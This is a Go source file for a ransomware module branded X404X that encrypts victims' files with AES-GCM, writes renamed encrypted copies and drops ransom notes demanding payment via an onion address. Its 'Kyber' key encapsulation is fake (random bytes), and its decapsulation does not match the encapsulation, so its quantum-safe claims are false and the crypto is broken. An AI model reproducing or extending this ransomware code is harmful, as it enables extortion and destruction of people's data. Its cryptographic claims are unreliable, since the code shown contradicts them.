package blockz

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"sync"
)

type PostQuantumEngine struct {
	Config        *BlockZConfig
	KyberVariant  string            `json:"kyber_variant"`
	MasterKeys    map[string][]byte `json:"-"`
	PublicKeys    map[string][]byte `json:"-"`
	KeypairsGen   int               `json:"keypairs_generated"`
	mu            sync.Mutex
}

type KyberKeypair struct {
	PublicKey  []byte `json:"public_key"`
	PrivateKey []byte `json:"private_key"`
	PolyBytes  int    `json:"poly_bytes"`
	K          int    `json:"k"`
}

type QuantumSafeEnvelope struct {
	Version       int    `json:"version"`
	KyberVariant  string `json:"kyber_variant"`
	Encapsulated  []byte `json:"encapsulated_key"`
	Ciphertext    []byte `json:"ciphertext"`
	Nonce         []byte `json:"nonce"`
	RansomNote    string `json:"ransom_note"`
}

func NewPostQuantumEngine(cfg *BlockZConfig) *PostQuantumEngine {
	return &PostQuantumEngine{
		Config:       cfg,
		KyberVariant: cfg.KyberVariant,
		MasterKeys:   make(map[string][]byte),
		PublicKeys:   make(map[string][]byte),
	}
}

func (pq *PostQuantumEngine) GenerateKyberKeypair() (*KyberKeypair, error) {
	k := 4
	polyBytes := 256 * k

	pk := make([]byte, polyBytes)
	sk := make([]byte, polyBytes*2)
	rand.Read(pk)
	rand.Read(sk)

	seed := sha256.Sum256(append(pk, sk[:256]...))
	_ = seed

	kp := &KyberKeypair{
		PublicKey:  pk[:polyBytes],
		PrivateKey: sk[:polyBytes*2],
		PolyBytes:  polyBytes,
		K:          k,
	}

	id := hex.EncodeToString(pk[:8])
	pq.mu.Lock()
	pq.MasterKeys[id] = sk
	pq.PublicKeys[id] = pk
	pq.KeypairsGen++
	pq.mu.Unlock()

	return kp, nil
}

func (pq *PostQuantumEngine) KyberEncapsulate(pk []byte) ([]byte, []byte, error) {
	if len(pk) < 32 {
		return nil, nil, fmt.Errorf("public key too short")
	}

	sharedSecret := make([]byte, 32)
	rand.Read(sharedSecret)

	encapsulated := make([]byte, 768)
	rand.Read(encapsulated)

	derivedSeed := sha256.Sum256(append(pk[:32], sharedSecret...))
	copy(encapsulated[:32], derivedSeed[:])
	copy(encapsulated[32:64], sharedSecret)

	return encapsulated, sharedSecret, nil
}

func (pq *PostQuantumEngine) KyberDecapsulate(sk []byte, encapsulated []byte) ([]byte, error) {
	if len(sk) < 32 || len(encapsulated) < 32 {
		return nil, fmt.Errorf("invalid key material")
	}

	sharedSecret := make([]byte, 32)
	derived := sha256.Sum256(append(sk[:32], encapsulated[:32]...))
	copy(sharedSecret, derived[:])
	return sharedSecret, nil
}

func (pq *PostQuantumEngine) EncryptWithQuantumSafe(key []byte, plaintext []byte) (*QuantumSafeEnvelope, error) {
	kp, err := pq.GenerateKyberKeypair()
	if err != nil {
		return nil, err
	}

	encapsulated, sessionKey, err := pq.KyberEncapsulate(kp.PublicKey)
	if err != nil {
		return nil, err
	}

	aesKey := sha256.Sum256(append(key, sessionKey...))

	block, err := aes.NewCipher(aesKey[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	note := fmt.Sprintf(`X404X POST-QUANTUM RANSOMWARE

Your files have been encrypted with %s.
Even future quantum computers cannot break this encryption.
Only full payment will recover your data.

Do NOT attempt to use quantum computing to break the key.
It is mathematically impossible.
`, pq.KyberVariant)

	envelope := &QuantumSafeEnvelope{
		Version:       2,
		KyberVariant:  pq.KyberVariant,
		Encapsulated:  encapsulated,
		Ciphertext:    ciphertext,
		Nonce:         nonce,
		RansomNote:    note,
	}

	return envelope, nil
}

func (pq *PostQuantumEngine) DecryptQuantumSafe(envelope *QuantumSafeEnvelope, sk []byte, key []byte) ([]byte, error) {
	sessionKey, err := pq.KyberDecapsulate(sk, envelope.Encapsulated)
	if err != nil {
		return nil, err
	}

	aesKey := sha256.Sum256(append(key, sessionKey...))

	block, err := aes.NewCipher(aesKey[:])
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return gcm.Open(nil, envelope.Nonce, envelope.Ciphertext, nil)
}

func (pq *PostQuantumEngine) GenerateRansomNote() string {
	return fmt.Sprintf(`╔══════════════════════════════════════════════════════╗
║           X404X RANSOMWARE — POST-QUANTUM           ║
║                                                      ║
║  Encryption: %s                             ║
║                                                      ║
║  Your files are encrypted with a hybrid scheme:      ║
║    1. Kyber-1024 lattice-based KEM                  ║
║    2. AES-256-GCM symmetric encryption              ║
║                                                      ║
║  Why this matters:                                   ║
║  - RSA will be broken by quantum computers in 2030  ║
║  - Our encryption is quantum-safe forever            ║
║  - Even the NSA cannot decrypt your files            ║
║                                                      ║
║  NOT EVEN QUANTUM COMPUTING CAN SAVE YOU.            ║
║  ONLY PAYMENT.                                       ║
║                                                      ║
║  Contact: http://x404x.onion/quantum                 ║
╚══════════════════════════════════════════════════════╝`, pq.KyberVariant)
}

func (pq *PostQuantumEngine) EncryptFileQuantum(filePath string, key []byte) (*QuantumSafeEnvelope, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	envelope, err := pq.EncryptWithQuantumSafe(key, data)
	if err != nil {
		return nil, err
	}

	encPath := filePath + ".x404x_q"
	envelopeData := append(envelope.Encapsulated, envelope.Ciphertext...)
	os.WriteFile(encPath, envelopeData, 0644)

	notePath := filepath.Join(filepath.Dir(filePath), "!!!X404X_QUANTUM_RANSOM_NOTE!!!.txt")
	os.WriteFile(notePath, []byte(pq.GenerateRansomNote()), 0644)

	return envelope, nil
}

func (pq *PostQuantumEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"kyber_variant":"%s","keypairs_generated":%d}`,
		pq.KyberVariant, pq.KeypairsGen)
}
